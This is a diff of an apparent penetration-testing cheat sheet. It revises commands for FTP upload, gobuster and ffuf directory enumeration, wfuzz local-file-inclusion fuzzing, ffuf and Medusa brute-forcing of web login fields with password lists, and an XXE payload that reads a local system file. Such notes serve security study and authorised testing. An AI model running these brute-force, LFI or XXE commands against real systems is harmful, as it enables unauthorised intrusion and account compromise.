@@ -156,7 +156,7 @@ ftp> ls
 # Alternative Client
 ncftp -u {USER} -p {PASS} -P {RPORT} {RHOST}
 
-# FTP-Upload
+# Upload FTP file directly
 ftp-upload -h {RHOST} -u 'anonymous' --password '' -d '/' {file.exe}
 
 # Download entire FTP directory
@@ -265,11 +265,7 @@ dnsenum {DOMAIN}
 <br />
 
 ```bash
-# TFTP
-# About: Connect to TFTP server
-# Download: Pre-installed on Kali Linux
-
-# Usage
+# TFTP connect
 tftp {IP ADDRESS}
 
 # Additional Information
@@ -285,57 +281,46 @@ tftp {IP ADDRESS}
 <br />
 
 ```bash
-# Gobuster
-# About: Used to brute force web directories
-# Download: https://github.com/OJ/gobuster/releases
-
-# Usage
-gobuster dir -u http://{IP ADDRESS} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+# Directory Enumeration
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://{RHOST}
+ffuf -ic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://{RHOST}/FUZZ"
 
 # Search File Extensions
-gobuster dir -u http://{IP ADDRESS} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,cgi,pl,sh
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,cgi,pl,sh -u http://{RHOST} 
+ffuf -ic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e '.html,.txt,.asp,.aspx' -u "http://{RHOST}/FUZZ"  
 
-# SOCKS5 flag
+# Blacklist Results by Page Size
+ffuf -ic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e '.html,.txt,.asp,.aspx' -u "http://{RHOST}/FUZZ" -fs {200)  
+
+# GOBUSTER SOCKS5 flag
 --proxy socks5://127.0.0.1:{PROXY PORT)
 
 # Throttle gobuster for bug bounties
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u {URL} -b "403,404,415,429,500" t 1 --delay 5s
 
-
 # Notes: Not recursive, only digs one level deep
 
-# Alternative word lists & locations
+################################################################################################################################################
 
-┌──(kali㉿kali)-[/usr/share/wordlists/dirb]
+# Local File Inclusion FUZZ
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt "http://{RHOST}/browse.php?p=source&file={FUZZ}"
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt "http://{RHOST}/browse.php?p=source&file={FUZZ}"
 
-big.txt  
-catala.txt  
-common.txt  
-euskera.txt  
-extensions_common.txt  
-indexes.txt  
-mutations_common.txt  
-others  
-small.txt  
-spanish.txt  
-stress  
-vulns
+#################################################################################################################################################
 
-┌──(kali㉿kali)-[/usr/share/wordlists/dirbuster]
+# Brute Force Web Fields
+# Usage - One variable FUZZ
+ffuf -c -request {FILE.req} -request-proto http -w /usr/share/seclists/Passwords/probable-v2-top1575.txt -fs {SIZE}
 
-apache-user-enum-1.0.txt      
-apache-user-enum-2.0.txt
-directories.jbrofuzz   
-directory-list-1.0.txt  
-directory-list-2.3-small.txt   
-directory-list-lowercase-2.3-small.txt
-directory-list-2.3-medium.txt 
-directory-list-lowercase-2.3-medium.txt
-```
+# Two Variable FUZZ
+ffuf -c -request {FILE.req} -request-proto http -mode clusterbomb -w {user.txt}:HFUZZ -w /usr/share/seclists/Passwords/probable-v2-top1575.txt:WFUZZ -fs {SIZE}
 
-#LFI FUZZ
-wfuzz -c -z file,LFI_FUZZ.txt "http://{RHOST}/browse.php?p=source&file=FUZZ"
+# EXAMPLE inside {FILE.req}
+username=admin$password=FUZZ
+username=WFUZZ$password=HFUZZ
 
+# Medusa HTTP Field Brute Force
+medusa -f -h {RHOST} -u {USER} -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/{DIR}
 
 <br />
 
@@ -343,7 +328,6 @@ wfuzz -c -z file,LFI_FUZZ.txt "http://{RHOST}/browse.php?p=source&file=FUZZ"
 ```bash
 # XXE - External XML Entity
 # About: Try against weak XML parsers
-
 
 # Usage Windows
 <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]>
